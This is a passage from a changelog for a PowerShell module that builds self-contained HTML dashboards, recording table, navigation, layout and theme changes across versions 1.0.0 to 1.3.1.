- **README — declaration order note**: New "Declaration order (important)" section explaining that tables must be declared before any dependent object (`Add-DhFilterCard` / `Add-DhBarChart` / `Set-DhTableLink`). This is the most common source of "filter does nothing" issues during script authoring.

## [1.3.1] — 2026-04-29

### Changed
- **Table row hover — visibility**: The `--bg-row-hover` colour token was bumped to a noticeably more saturated shade in every built-in theme (Default, Azure, VMware, Grey, Company — light + dark variants) and in the inline `theme-forced-*` fallbacks in `Get-DhCssBase.ps1`. Previously the hover background sat very close to `--bg-table` / `--bg-row-alt`, making the highlight barely perceptible.
- **Table row hover — accent edge**: `.data-table tbody tr:hover` now also draws a 3 px inset box-shadow on the left edge using `--accent-primary`, mirroring the visual affordance of `.row-selected` and giving the hovered row a clear focal cue regardless of the chosen theme.

## [1.3.0] — 2026-04-22

### Added
- **Three-tier navigation — `-NavSubGroup` parameter**: New optional `-NavSubGroup` parameter on `Add-DhTable`, `Add-DhHtmlBlock`, `Add-DhCollapsible`, `Add-DhFilterCard`, and `Add-DhBarChart`. When used together with `-NavGroup`, a third pill-shaped nav strip appears below the subnav bar and filters items within the active group by subgroup. Clicking a pill narrows the group view to items tagged with that subgroup; clicking the active pill again clears the filter. Items inside a group that have no `NavSubGroup` remain visible regardless of pill state. Fully backward compatible — existing scripts work unchanged.
- **Collapsible card width — `-CardWidth` parameter**: `Add-DhCollapsible` accepts `small` | `normal` (default) | `large` | `xlarge` | `auto`. Controls the `min-width`/`max-width` of each card in the grid (`small` 150–220 px, `normal` 200–320 px, `large` 280–480 px, `xlarge` 360–640 px, `auto` 240 px min and no upper bound).

## [1.2.2] — 2026-04-15

### Changed
- **Layout — horizontal padding tuned**: Horizontal padding on `.report-body`, `.nav-inner`, and `.subnav-inner` increased from `8px` (`--space-sm`) to `16px` (`--space-md`) for better visual balance after the widescreen layout change in 1.2.1.

## [1.2.1] — 2026-04-15

### Changed
- **Layout — widescreen padding**: `max-width` on `.report-body`, `.nav-inner`, and `.subnav-inner` increased from `1600px` to `2400px`; horizontal padding reduced from `24px` (`--space-lg`) to `8px` (`--space-sm`) on all three containers. On a typical 1920px display this reduces the empty side margin from ~184px to ~8px per side.

## [1.2.0] — 2026-04-15

### Changed
- **Nav bar — logo removed**: The logo image is no longer rendered inside the sticky nav bar. The header logo is unaffected.
- **Nav bar — `NavTitle` default**: `New-DhDashboard` now defaults `NavTitle` to `''` (empty string) instead of the report title, resulting in a cleaner nav bar showing only navigation links by default. Pass `-NavTitle 'My Label'` explicitly to restore a label.
- **Filter/chart section spacing**: Reduced `margin-bottom` on `.filter-card-section` and `.bar-chart-section` from `16px` to `4px`, top padding on `.filter-card-section` from `8px` to `6px`, top/bottom padding on `.bar-chart-section` from `16px` to `8px`, and title `margin-bottom` from `8–16px` to `4px` for a tighter layout.

### Fixed
- **Two-tier nav — group tabs hidden behind tall header on scroll**: The sticky nav `top` offset was hardcoded to `calc(var(--header-height) + 8px)` (84 px), but the actual rendered header is taller when InfoFields are present. `syncNavTop()` now measures `header.offsetHeight` at runtime and sets `nav.style.top` dynamically (also wired to `window resize`), so the full nav bar (group tabs + subnav strip) is always visible below the header when scrolling.

## [1.1.0] — 2026-04-14

### Fixed
- **Two-tier nav — blocks hidden when group has no matching table**: `Export-DhDashboard` now collects `NavGroup` values from blocks as well as tables when building the group-tab list. Previously, a filter card, bar chart, html block, or collapsible section that used `-NavGroup` but had no table in the same group would generate a hidden `block-section` with no reachable group tab.
- **Two-tier nav — empty subnav strip for block-only groups**: When the active group contains blocks but no table sub-links, the subnav strip is now hidden automatically by JS. This avoids an awkward empty second bar.
- **Flat nav — ungrouped blocks hidden on first panel click**: `showPanel` in flat-nav mode previously cleared `panel-active` from *all* `.block-section` elements, including those with no `data-navgroup` attribute that are meant to always be visible. Now only grouped block-sections (those with `data-navgroup`) are toggled by panel navigation.

### Changed
- **Filter card design** — cards are now more compact: reduced padding (`5px 10px`), border reduced from 2 px to 1 px, border-radius reduced to `radius-sm`, min-width reduced from 110 px to 80 px, name font-size reduced to `size-xs`. Active state now shows a 2 px box-shadow ring instead of only a background fill. Section heading reduced from `size-md` to `size-sm` and its bottom margin halved.

## [1.0.0] — 2026-04-12

### Added
- `New-DhDashboard` — create a dashboard object with title, subtitle, logo, theme, nav title, info fields
- `Add-DhTable` — sortable, filterable, pageable data tables with:
  - Column types: text, progressbar, badge
  - Formatting: number, currency, bytes, percent, datetime, duration
  - Column options: Bold, Italic, Font (mono/ui/display), Align, Width, PinFirst
  - Footer aggregates: sum, avg, min, max, count
  - Threshold colouring: numeric (Min/Max) and string (Value) rules
  - Row highlighting driven by threshold match
  - Embedded pie charts (multiple per table)
  - Multi-row checkbox selection
  - Custom export filename for CSV/XLSX/PDF downloads
  - Two-tier navigation via `-NavGroup`
- `Set-DhTableLink` — master/detail table linking with click-to-filter; chainable (A→B→C)
- `Add-DhSummary` — KPI metric tiles with icon, value, label, class, and format support
- `Add-DhBarChart` — horizontal proportional bar chart with optional click-to-filter
- `Add-DhFilterCard` — clickable card grid filter (single-select and multi-select)
- `Add-DhHtmlBlock` — free-form HTML panel in five styles: info, warn, danger, ok, neutral
- `Add-DhCollapsible` — collapsible section with card-grid or free-form HTML content
- `Export-DhDashboard` — write a self-contained HTML file with all CSS, JS, and data embedded
- `Get-DhTheme` — list or inspect built-in theme families; save CSS to disk
- Five built-in theme families: Default, Azure, VMware, Grey, Company
  - Each family embeds both light and dark variants; runtime toggle button in nav bar
- Two-tier navigation: flat nav bar or grouped primary-tabs + subnav strip
- Client-side export: CSV (no CDN), XLSX and PDF (cdnjs)
- Light/dark theme toggle with both variants always embedded in the HTML output

